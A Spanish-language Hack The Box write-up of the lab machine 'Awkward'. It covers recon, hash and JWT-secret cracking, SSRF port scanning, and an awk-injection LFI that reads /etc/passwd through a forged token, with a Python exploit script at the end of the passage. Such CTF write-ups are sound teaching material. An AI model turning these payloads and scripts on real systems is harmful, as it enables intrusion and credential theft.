---
title: "HTB: Resolución de Awkward"
date: 2023-02-25 06:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [ssrf, lfi, command injection]     ## TAG names should always be lowercase
image: awkward.jpg
img_path: /photos/2023-02-25-Awkward-WriteUp/
---

***Awkward*** es una máquina *Linux* con dos servicios expuestos: *SSH* y *HTTP*. Gracias a la información que nos ofrece un **archivo de la página web**, seremos capaces de encontrar y autenticarnos en un panel de *login*. Una vez dentro, descubriemos un *endpoint* vulnerable a ***Server Side Request Forgery (SSRF)***, que nos permitirá descubrir un servicio interno. A través de la información que nos brinda este servicio, conseguiremos ***Local file Inclusion (LFI)*** explotando un *endpoint* de la API. Encontraremos las credenciales *SSH* del usuario *bean* en una nota de **xpad**. Para pivotar al usuario *root*, primero deberemos convertirnos en *www-data*. Explotaremos una **inyección de comandos** que se acontece en un **subdominio**, consiguiendo ***Remote Code Execution (RCE)*** como *www-data*. Finalmente, para conseguir **máximos privilegios**, nos aprovecharemos de un *script* que está ejecutando *root* a intervalos regulares de tiempo.

## Clasificación de dificultad de la máquina

![imagen 1](stats.png)

## Reconocimiento

### ping

Mandamos un _ping_ a la máquina víctima, con la finalidad de conocer su sistema operativo y saber si tenemos conexión con la misma. Un _TTL_ menor o igual a 64 significa que la máquina es _Linux_ y un _TTL_ menor o igual a 128 significa que la máquina es _Windows_.

```bash
$> ping -c 1 10.10.11.185

PING 10.10.11.185 (10.10.11.185) 56(84) bytes of data.
64 bytes from 10.10.11.185: icmp_seq=1 ttl=63 time=91.4 ms

--- 10.10.11.185 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 91.385/91.385/91.385/0.000 ms
```

Comprobamos que nos enfrentamos a una máquina **_Linux_**, ya que su *TTL* es 63.

### Port Discovery

Procedemos a escanear todo el rango de puertos de la máquina víctima, con la finalidad de encontrar aquellos que estén abiertos (_status open_). Lo hacemos con la herramienta ***nmap***.

```bash
$> sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.11.185 -oG allPorts

Nmap scan report for 10.10.11.185
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

**-sS** efectúa un _TCP SYN Scan_, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no más lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple _verbose_ para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**-oG** exportará la evidencia en formato _grepeable_ al fichero *allPorts* en este caso.

Hemos encontrado **dos puertos abiertos**, el **22** y el **80**. Un **puerto abierto** está **escuchando solicitudes de conexión entrantes**.

Vamos a lanzar una serie de _scripts_ básicos de enumeración, en busca de los **servicios** que están corriendo y de sus **versiones**.

```bash
$> sudo nmap -sCV -p22,80 10.10.11.185 -oN targeted

Nmap scan report for 10.10.11.185
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA)
|_  256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El puerto **22** es **SSH** y el puerto **80** **HTTP**. De momento, al no disponer de credenciales para autenticarnos por _SSH_, nos centraremos en auditar el puerto **80**.

### Puerto 80 abierto (HTTP)

#### Tecnologías empleadas

En primer lugar, utilizaremos **_whatweb_** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:

![imagen 2](Pasted image 20230220095813.png)

Nos damos cuenta de que el servicio web que corre en el puerto **80** nos redirige al dominio ***hat-valley.htb***. Para que nuestra máquina pueda resolver a este dominio deberemos añadirlo al final de nuestro _/etc/hosts_, de la forma:  `10.10.11.185 hat-valley.htb`.

La página está usando como servidor web *nginx 1.18.0*.

Podemos lanzar también un *curl* para inspeccionar las cabeceras de respuesta con el comando `curl http://10.10.11.185 -I`:

![imagen 3](Pasted image 20230224003507.png)

**-I** sirve para realizar una solicitud de encabezado HTTP.

No encontramos nada relevante.

Por último, utilizaremos la extensión de navegador *Wappalyzer* para indagar un poco más en las tecnologías que utiliza el servicio web:

![imagen 4](Pasted image 20230224011229.png)

***Vue.js*** es un *framework* de *JavaScript* utilizado para construir interfaces de usuario en aplicaciones web. Pasaremos ahora a investigar la página principal.

#### Investigando web

Al acceder a http://10.10.11.185 vemos lo siguiente:

![imagen 5](Pasted image 20230220102036.png)

Se trata de una página web dedicada al mundo de los gorros. Podemos encontrar información sobre diferentes tipos de gorros y sobre las personas que conforman el equipo de desarrollo. También nos encontramos un mensaje interesante al final de la web:

![imagen 6](Pasted image 20230224004018.png)

Parece que están desarrollando una tienda online. Es posible que exista un **subdominio** que esté *hosteando* la página web. 

Si inspeccionamos el código fuente, con *Ctrl+U*, nos encontramos con un **archivo** interesante, ***/js/app.js***:

![imagen 7](Pasted image 20230220102140.png)

#### Inspeccionando app.js

*app.js* generalmente contiene código *JavaScript* personalizado que se utiliza para agregar funcionalidad interactiva al sitio web. Podremos visualizar su contenido viajando a *http://hat-valley.htb/js/app.js*:

![imagen 8](Pasted image 20230224005044.png)

Al final del archivo podemos encontrar varias referencias a archivos de configuración de *hat-valley.htb*. Por ejemplo, encontramos la siguiente información relacionada con el fichero *App.vue*:

![imagen 9](Pasted image 20230224005652.png)

El archivo *App.vue* es uno de los archivos centrales en una aplicación *Vue.js*, ya que es el componente principal que contiene todos los demás componentes. El código fuente de *App.vue* se encuentra en la cadena codificada en **base64**. Primero la decodificaremos y trataremos el *output* con *jq*:

```bash
echo "eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9zcmMvQXBwLnZ1ZS5qcyIsInNvdXJjZXMiOlsid2VicGFjazovLy8uL3NyYy9BcHAudnVlP2FlMmYiXSwic291cmNlc0NvbnRlbnQiOlsiaW1wb3J0IHsgcmVuZGVyIH0gZnJvbSBcIi4vQXBwLnZ1ZT92dWUmdHlwZT10ZW1wbGF0ZSZpZD03YmE1YmQ5MFwiXG5pbXBvcnQgc2NyaXB0IGZyb20gXCIuL0FwcC52dWU/dnVlJnR5cGU9c2NyaXB0Jmxhbmc9anNcIlxuZXhwb3J0ICogZnJvbSBcIi4vQXBwLnZ1ZT92dWUmdHlwZT1zY3JpcHQmbGFuZz1qc1wiXG5cbmltcG9ydCBleHBvcnRDb21wb25lbnQgZnJvbSBcIi92YXIvd3d3L2hhdC12YWxsZXkuaHRiL25vZGVfbW9kdWxlcy9AdnVlL2NsaS1zZXJ2aWNlL25vZGVfbW9kdWxlcy92dWUtbG9hZGVyLXYxNi9kaXN0L2V4cG9ydEhlbHBlci5qc1wiXG5jb25zdCBfX2V4cG9ydHNfXyA9IC8qI19fUFVSRV9fKi9leHBvcnRDb21wb25lbnQoc2NyaXB0LCBbWydyZW5kZXInLHJlbmRlcl0sWydfX2ZpbGUnLFwic3JjL0FwcC52dWVcIl1dKVxuLyogaG90IHJlbG9hZCAqL1xuaWYgKG1vZHVsZS5ob3QpIHtcbiAgX19leHBvcnRzX18uX19obXJJZCA9IFwiN2JhNWJkOTBcIlxuICBjb25zdCBhcGkgPSBfX1ZVRV9ITVJfUlVOVElNRV9fXG4gIG1vZHVsZS5ob3QuYWNjZXB0KClcbiAgaWYgKCFhcGkuY3JlYXRlUmVjb3JkKCc3YmE1YmQ5MCcsIF9fZXhwb3J0c19fKSkge1xuICAgIGNvbnNvbGUubG9nKCdyZWxvYWQnKVxuICAgIGFwaS5yZWxvYWQoJzdiYTViZDkwJywgX19leHBvcnRzX18pXG4gIH1cbiAgXG4gIG1vZHVsZS5ob3QuYWNjZXB0KFwiLi9BcHAudnVlP3Z1ZSZ0eXBlPXRlbXBsYXRlJmlkPTdiYTViZDkwXCIsICgpID0+IHtcbiAgICBjb25zb2xlLmxvZygncmUtcmVuZGVyJylcbiAgICBhcGkucmVyZW5kZXIoJzdiYTViZDkwJywgcmVuZGVyKVxuICB9KVxuXG59XG5cblxuZXhwb3J0IGRlZmF1bHQgX19leHBvcnRzX18iXSwibWFwcGluZ3MiOiJBQUFBO0FBQUE7QUFBQTtBQUFBO0FBQUE7QUFBQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQUE7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBIiwic291cmNlUm9vdCI6IiJ9" | base64 -d | jq
```

El código fuente de *App.vue* se encuentra en el campo ***sourcesContent***:

```json
{
  "version": 3,
  "file": "./src/App.vue.js",
  "sources": [
    "webpack:///./src/App.vue?ae2f"
  ],
  "sourcesContent": [
    "import { render } from \"./App.vue?vue&type=template&id=7ba5bd90\"\nimport script from \"./App.vue?vue&type=script&lang=js\"\nexport * from \"./App.vue?vue&type=script&lang=js\"\n\nimport exportComponent from \"/var/www/hat-valley.htb/node_modules/@vue/cli-service/node_modules/vue-loader-v16/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render],['__file',\"src/App.vue\"]])\n/* hot reload */\nif (module.hot) {\n  __exports__.__hmrId = \"7ba5bd90\"\n  const api = __VUE_HMR_RUNTIME__\n  module.hot.accept()\n  if (!api.createRecord('7ba5bd90', __exports__)) {\n    console.log('reload')\n    api.reload('7ba5bd90', __exports__)\n  }\n  \n  module.hot.accept(\"./App.vue?vue&type=template&id=7ba5bd90\", () => {\n    console.log('re-render')\n    api.rerender('7ba5bd90', render)\n  })\n\n}\n\n\nexport default __exports__"
  ],
  "mappings": "AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AAAA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA",
  "sourceRoot": ""
}
```

Copiamos el contenido de *sourcesContent* y utilizamos *echo* para que se interpreten los saltos de línea y *sed* para eliminar las contra barras:

```bash
echo 'import { render } from \"./App.vue?vue&type=template&id=7ba5bd90\"\nimport script from \"./App.vue?vue&type=script&lang=js\"\nexport * from \"./App.vue?vue&type=script&lang=js\"\n\nimport exportComponent from \"/var/www/hat-valley.htb/node_modules/@vue/cli-service/node_modules/vue-loader-v16/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render],['__file',\"src/App.vue\"]])\n/* hot reload */\nif (module.hot) {\n  __exports__.__hmrId = \"7ba5bd90\"\n  const api = __VUE_HMR_RUNTIME__\n  module.hot.accept()\n  if (!api.createRecord('7ba5bd90', __exports__)) {\n    console.log('reload')\n    api.reload('7ba5bd90', __exports__)\n  }\n  \n  module.hot.accept(\"./App.vue?vue&type=template&id=7ba5bd90\", () => {\n    console.log('re-render')\n    api.rerender('7ba5bd90', render)\n  })\n\n}\n\n\nexport default __exports__' | sed 's/\\//g'
```

Finalmente, obtenemos el siguiente resultado:

```javascript
import { render } from "./App.vue?vue&type=template&id=7ba5bd90"
import script from "./App.vue?vue&type=script&lang=js"
export * from "./App.vue?vue&type=script&lang=js"

import exportComponent from "/var/www/hat-valley.htb/node_modules/@vue/cli-service/node_modules/vue-loader-v16/dist/exportHelper.js"
const __exports__ = /*#__PURE__*/exportComponent(script, [[render,render],[__file,"src/App.vue"]])
/* hot reload */
if (module.hot) {
  __exports__.__hmrId = "7ba5bd90"
  const api = __VUE_HMR_RUNTIME__
  module.hot.accept()
  if (!api.createRecord(7ba5bd90, __exports__)) {
    console.log(reload)
    api.reload(7ba5bd90, __exports__)
  }
  
  module.hot.accept("./App.vue?vue&type=template&id=7ba5bd90", () => {
    console.log(re-render)
    api.rerender(7ba5bd90, render)
  })

}


export default __exports__
```

Nada interesante, aparte de descubrir que los archivos de configuración de la web se encuentran almacenados en el directorio */var/www/hat-valley.htb/* de la máquina víctima.

En *Vue.js*, los diferentes *endpoints* de una web se suelen definir en el archivo *routes.js* o *router.js*. En *app.js* encontraremos una referencia a este archivo:

![imagen 10](Pasted image 20230224012044.png)

Le volvemos a aplicar a la cadena en *base64* el mismo tratamiento que antes y deberíamos obtener el siguiente resultado:

```javascript
import { createWebHistory, createRouter } from "vue-router";
import { VueCookieNext } from 'vue-cookie-next'
import Base from '../Base.vue'
import HR from '../HR.vue'
import Dashboard from '../Dashboard.vue'
import Leave from '../Leave.vue'

const routes = [
  {
    path: "/",
    name: "base",
    component: Base,
  },
  {
    path: "/hr",
    name: "hr",
    component: HR,
  },
  {
    path: "/dashboard",
    name: "dashboard",
    component: Dashboard,
    meta: {
      requiresAuth: true
    }
  },
  {
    path: "/leave",
    name: "leave",
    component: Leave,
    meta: {
      requiresAuth: true
    }
  }
];

const router = createRouter({
  history: createWebHistory(),
  routes,
});

router.beforeEach((to, from, next) => {
  if((to.name == 'leave' || to.name == 'dashboard') && VueCookieNext.getCookie('token') == 'guest') { //if user not logged in, redirect to login
    next({ name: 'hr' })
  }
  else if(to.name == 'hr' && VueCookieNext.getCookie('token') != 'guest') { //if user logged in, skip past login to dashboard
    next({ name: 'dashboard' })
  }
  else {
    next()
  }
})

export default router;
```

`/` nos lleva a la página principal, `/hr` nos conduce a un panel de *login* y `/dashboard` y `/leave` nos redirigen a `hr`. Seguramente, para acceder a los dos últimos *endpoint* necesitaremos estar autenticados.

El aspecto del **panel** de **login** es el siguiente:

![imagen 11](Pasted image 20230220102301.png)

Podríamos intentar explotar un *SQLI* o *NoSQLI* para burlar el panel de login, pero no obtendremos el resultado esperado. En este punto, deberemos encontrar unas credenciales válidas. Vamos a continuar investigando más archivos presentes en *app.js*. 

El archivo *staff.js* nos puede interesar para encontrar usuarios válidos:

![imagen 12](Pasted image 20230224013503.png)

Le damos formato a la cadena en *base64* y obtenemos el siguiente código:

```javascript
import axios from 'axios'
axios.defaults.withCredentials = true
const baseURL = "/api/"

const staff_details = () => {
    return axios.get(baseURL + 'staff-details')
        .then(response => response.data)
}

export default {
    staff_details
}
```

Para **obtener detalles sobre los clientes**, se está accediendo a */api/staff-details*, es decir, a *http://hat-valley.htb/api/staff-details*. Echamos un vistazo al *enpoint* y nos encontramos con **credenciales de usuarios**. Las contraseñas se encuentran *hasheadas*:

![imagen 13](Pasted image 20230224235131.png)

Podemos utilizar `curl` y `jq` para mejorar la visualización de la información:

```json
[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]
```

Tenemos **cuatro usuarios** y cuatro contraseñas *hasheadas*. Almacenaremos estos *hashes* en un archivo y **los intentaremos romper a través de un ataque por diccionario**.

#### Rompiendo hashes con John The Ripper

Podemos intentar **romper** los *hashes* con **_John The Ripper_**. Pero antes, debemos descubrir que función de *hash* criptográfica se ha utilizado para *hashear* las contraseñas.  Utilizaremos *hash-identifier*:

![imagen 14](Pasted image 20230225000032.png)

La función de *hash* que se ha utilizado para *hashear* las contraseñas es ***SHA-256***. 

El siguiente paso será almacenar todos los *hashes* en un archivo. Este comando parsea la información de los usuarios para que muestre únicamente el nombre de usuario y su *hash* separado por dos puntos:

```bash
curl http://hat-valley.htb/api/staff-details -s | jq -r '.[] | "\(.username):\(.password)"'

christine.wool:6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1
jackson.lightheart:b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436
bean.hill:37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f
```

Podemos redirigir la salida del comando anterior a un archivo llamado *hashes*, por ejemplo.

Finalmente, ejecutaremos *john* empleando el *rockyou.txt* como diccionario. El comando será el siguiente:

```bash
john -w=/usr/share/wordlists/rockyou.txt hashes --format=raw-sha256
```

Pasado un tiempo, nos descubre unas **credenciales**:

![imagen 15](Pasted image 20230220104918.png)

La contraseña del usuario ***christopher.jones*** es ***chris123***. Utilizaremos estas credenciales para autenticarnos en el panel de login (*http://hat-valley.htb/hr*).

#### Autenticándonos en la web

Una vez autenticados con las credenciales `christopher.jones:chris123`, vemos lo siguiente:

![imagen 16](Pasted image 20230220105108.png)

Nos encontramos con una **funcionalidad**, en la parte inferior izquierda, que se encarga de **monitorizar el estado de la tienda *online***. Podemos clicar en el botón *Refresh* para refrescar el estado de la tienda *online*. 

También encontramos un apartado llamado *Leave Requests*, en el que podremos subir un comentario:

![imagen 17](Pasted image 20230225001701.png)

Los parámetros se tramitan por POST a la URL *http://hat-valley.htb/api/submit-leave*:

![imagen 18](Pasted image 20230225001637.png)

Podemos provocar un **error** para ver **como se comporta el servicio web**. Incorporando una **comilla doble** de más en uno de los parámetros, el **servidor** responde con el siguiente **mensaje**:

![imagen 19](Pasted image 20230225002558.png)

El error nos reporta que el directorio donde se aloja el servicio web es */var/www/hat-valley.htb/*. Poco interesante, ya que este dato ya lo sabíamos. 

También podríamos intentar explotar una inyección de comandos, pero **parece que el servidor está sanitizando nuestra entrada**: 

![imagen 20](Pasted image 20230225105150.png)

Vamos a interceptar la **petición que se tramita al clicar en el botón** *Refresh* del *dashboard*. La petición es la siguiente:

![imagen 21](Pasted image 20230225003118.png)

Se está tramitando por *GET* una petición a *http://hat-valley.htb/api/store-status?url="http://store.hat-valley.htb*. Descubrimos un **subdominio** en el parámetro *url*: **store.hat-valley.htb**. Vamos a introducirlo en nuestro archivo */etc/hosts* para poder acceder a él:

![imagen 22](Pasted image 20230225003608.png)

Necesitaremos disponer de **credenciales** para visualizar el contenido de http://store.hat-valley.htb:

![imagen 23](Pasted image 20230225003751.png)

Aparte de este subdominio, también es interesante que se esté utilizando un **parámetro para apuntar a un sitio web**. Con la **finalidad de encontrar alguna vulnerabilidad en este parámetro**, voy a desplegar un servidor web con python y voy a modificar *url* para que apunte a mi web. Desplegamos un servicio web:

![imagen 24](Pasted image 20230225004514.png)

Ahora cambiaremos el valor de *url* por *http://10.10.14.130*, que corresponde al valor de la IP de mi interfaz *tun0*.

El resultado es el siguiente:

![imagen 25](Pasted image 20230225004615.png)


El servidor responde con el contenido del directorio donde he desplegado el servidor web. Parece que el **parámetro *url*** **no está siendo sanitizando**, permitiéndonos apuntar a sitios web que no corresponden. Esta vulnerabilidad se conoce como *Open Redirect*. 

Un ***Open Redirect*** (redirección abierta) es una vulnerabilidad de seguridad que ocurre cuando una aplicación web redirige al usuario a una página externa, sin validar adecuadamente la URL de destino. Esto permite que un atacante pueda engañar al usuario para que haga clic en un enlace malicioso que lo redirige a una página fraudulenta o peligrosa.

Ahora bien, no conseguiremos ganar acceso a la máquina explotando el *Open Redirect*. Otra vulnerabilidad que se puede acontecer es un **SSRF**, forzando a que el sitio web haga peticiones a servicios internos de la máquina.

## Ganando acceso como bean

### Explotando ataque SSRF

¿Que pasaría si pudiésemos modificar el valor del parámetro *url* por una URL que apunte a un servicio de la máquina víctima, por ejemplo *http://10.10.11.185*? Podríamos visualizar el código HTML de la web. En este caso, ya tenemos acceso al código fuente desde el navegador, pero, ¿**Y si corre otro servicio web en otro puerto de la máquina víctima en el que no tenemos acceso desde el exterior y pudiésemos ver su código fuente**? 

Un ataque **_SSRF (Server-Side Request Forgery)_** es una técnica utilizada por atacantes para forzar a un servidor web a realizar solicitudes de red a direcciones IP o dominios específicos. Esto permite a los atacantes acceder a **información confidencial** o llevar a cabo acciones malintencionadas **en nombre del servidor**.

En este caso, lograremos como atacantes que el servidor web víctima envíe solicitudes a servicios internos, que normalmente no estarían disponibles de cara al exterior. Podemos comprobar si el ataque funciona modificando el parámetro *url*  por `http://localhost`. Parece que si que funciona y nos hace un *redirect* a la página principal. 

Para llevar a cabo un **escaneo interno de puertos**, utilizaré la herramienta _wfuzz_ con los siguientes parámetros:

```bash
wfuzz -c -u 'http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ"' -z range,1-65535 --hh=0
```

**-c** es formato colorizado.  
**–hh=0** para esconder todas aquellas respuestas que contengan 0 caracteres (los servicios que no están disponibles devuelven esta cantidad de caracteres).  
**-z** para especificar el tipo de _payload_. En este caso, estamos especificando un _payload_ del tipo rango, que iterará desde el 1 hasta el 65535 (todo el rango de puertos).  
**-u** para especificar la _url_.  

Pasado un tiempo, obtendremos el siguiente resultado:

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ"
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000080:   200        8 L      13 W       132 Ch      "80"                                                                                                                     
000003002: 200        685 L    5834 W     77002 Ch    "3002" 
```

La máquina víctima está corriendo por el puerto **3002** un servicio solamente expuesto de manera interna.

Nos descargaremos el código fuente de http://localhost:3002 con *wget*:

```bash
wget 'http://hat-valley.htb/api/store-status?url="http://localhost:3002"' -O index.html
```

Vamos a investigar este servicio.

### Investigando Hat Valley API

Desplegaremos un servidor web con *python*, por ejemplo, para inspeccionar el *index.html* desde el navegador:

![imagen 26](Pasted image 20230225012000.png)

El **servicio** que corre en el puerto **3002** de la máquina víctima es la **API de *Hat Valley***. Tenemos acceso a la implementación de los *endpoints* de la API. 

* */api/login* se utiliza para el inicio de sesión. No encontramos nada fuera de lo normal en su implementación.
* */api/submit-leave* se utiliza para subir un comentario en la sección *Leave Requests* de la web. El código es el siguiente:

```javascript
app.post('/api/submit-leave', (req, res) => {
  const {reason, start, end} = req.body
  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  if(!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]

  const badInUser = bad.some(char => user.includes(char));
  const badInReason = bad.some(char => reason.includes(char));
  const badInStart = bad.some(char => start.includes(char));
  const badInEnd = bad.some(char => end.includes(char));

  if(badInUser || badInReason || badInStart || badInEnd) {
    return res.status(500).send("Bad character detected.")
  }

  const finalEntry = user + "," + reason + "," + start + "," + end + ",Pending\r"

  exec(`echo "${finalEntry}" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send("Failed to add leave request")
    }
    return res.status(200).send("Successfully added new leave request")
  })
})
```

Se está utilizando un *array* de caracteres maliciosos para **sanitizar** el *input* del usuario. Este *array* contempla casi todos los caracteres especiales. Algunos que no contempla son la */*, el *+*, el *=* y la *'*. Finalmente, se ejecuta un comando a nivel de sistema para guardar un comentario en */var/www/private/leave_requests.csv*. 

* */api/all-leave* recupera el historial de comentarios para el usuario que inició sesión. Su implementación es la siguiente:

```javascript
app.get('/api/all-leave', (req, res) => {
  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  if(!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]

  const badInUser = bad.some(char => user.includes(char));

  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }

  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }
    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})
```

También se utiliza un *array* de caracteres maliciosos, pero esta vez se utiliza para **sanitizar** el nombre de usuario, que será extraído del *token* de sesión. Posteriormente, se utiliza este valor para ejecutar un comando a nivel de sistema. El comando utiliza `awk` para buscar y filtrar líneas de texto en un archivo *CSV* ubicado en */var/www/private/leave_requests.csv*, es decir, para extraer los comentarios pertenecientes a un usuario.


Al tratarse de un *Json Web Token*, en [jwt.io](https://jwt.io/) podemos inspeccionar el *token* de sesión del usuario *christopher.jones*:

![imagen 27](Pasted image 20230225114632.png)

Efectivamente, el *token* contiene un campo *username* y la variable *user* se igualará a este valor.

Estos son los comentarios subidos por *christopher.jones*:

![imagen 28](Pasted image 20230225113946.png)

A diferencia de */api/submit-leave*, podríamos utilizar la *'* y la */* para crear un *user* malicioso que nos **permita volcar archivos locales de la máquina víctima**.

#### Explotando Local File Inclusion (LFI)

##### Contexto

Como he comentado anteriormente, `"awk '/" + user + "/' /var/www/private/leave_requests.csv"` busca y filtra líneas de texto en un archivo CSV ubicado en */var/www/private/leave_requests.csv*, en este caso que contengan el valor de la variable *user*.

Por ejemplo, *user* es *fran*, el comando sería:

```bash
awk '/fran/' /var/www/private/leave_requests.csv
```

Si tuviésemos control total de la variable *user* podríamos construir un *payload* malicioso de la siguiente forma:

```bash
/' /etc/passwd '/
```

Resultando en el siguiente comando:

```bash
awk '/' /etc/passwd '/' /var/www/private/leave_requests.csv
```

La expresión regular */* utilizada en el comando no realiza una coincidencia con un patrón específico, en su lugar, simplemente busca y selecciona todas las líneas en ambos archivos. Por lo tanto, **el resultado del comando será una lista de todas las líneas en ambos archivos.**, consiguiendo así inclusión de archivos locales (**LFI**). 

Ahora bien, para controlar el valor de la variable *user*, que es extraído de la *cookie* de sesión, deberíamos encontrar el *secreto* para forjar una *cookie* personalizada. Este secreto puede ser obtenido enumerando la máquina víctima o bien intentando romper la *cookie* a través de un **ataque por diccionario**.

#####  Obteniendo secreto a través de un ataque por diccionario

El **secreto de una cookie** (también conocido como _cookie secret_ en inglés) es una cadena de caracteres aleatoria y secreta que se utiliza para firmar las _cookies_ en una aplicación web. Disponiendo del **secreto**, podemos forjar una _cookie_ con los datos que queramos.

Utilizaremos la herramienta *John The Ripper* para intentar romper la *cookie* de sesión del usuario *christopher.jones*.

La *cookie* de sesión del usuario *christopher.jones* es:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc3MjgwNDM0fQ.GkoWxsu5S9IPYID2OSiKkWw6TYKlqioZtTMZj8D_RVw
```

La guardaremos en un archivo y ejecutaremos *john* de la siguiente forma:

```bash
john -w=/usr/share/wordlists/rockyou.txt cookie
```

![imagen 29](Pasted image 20230225114535.png)

El secreto es ***123beany123***.

##### Explotación

Primero, intentaremos listar el */etc/passwd* de la máquina víctima. El valor *username* de la *cookie* lo deberemos modificar por `/' /etc/passwd '/`:

![imagen 30](Pasted image 20230225115443.png)

En la parte inferior derecha se ha escrito el secreto. Copiamos la *cookie*, la sustituimos por la de *christopher.jones*, y enviamos una petición a *http://hat-valley.htb/api/all-leave*. Lo haré con la herramienta `curl`:

```bash
curl http://hat-valley.htb/api/all-leave -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICcvIiwiaWF0IjoxNjc3MjgwNDM0fQ.YFFYpTpz0SDzxiqDjwIEe7evUi3T3wtl7QCUxIafRwk'
```

El resultado es el siguiente:

![imagen 31](Pasted image 20230225115708.png)

Para automatizar el proceso de creación de la *cookie* y el envío de la solictud, crearé un *script* en *python*. Es el siguiente:

```python
#!/usr/bin/python3 

## pip install colorama

import jwt,requests, signal, sys
from colorama import Fore, Style

## Ctrl + C
def def_handler(sig, frame):
	print("[!] Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def create_token(file):
	header = {"alg": "HS256", "typ": "JWT"}
	payload = {"username": f"/' {file} '/", "iat": "1677174913"}
	secret = "123beany123"
	return jwt.encode(payload, secret, algorithm="HS256", headers=header)

def make_request(token):
	headers = {"Cookie": f"token= {token}"}
	url = "http://hat-valley.htb/api/all-leave"
	response = requests.get(url, headers=headers)
	print(Fore.GREEN + "\n" + response.text + Style.RESET_ALL)

if __name__ == '__main__':
	while 1:
		file = input(Fore.RED + "$> " + Style.RESET_ALL)
		token = create_token(file)
		make_request(token)
```

Simplemente, lo ejecutamos y debería aparecer el siguiente *prompt* para introducir archivos:

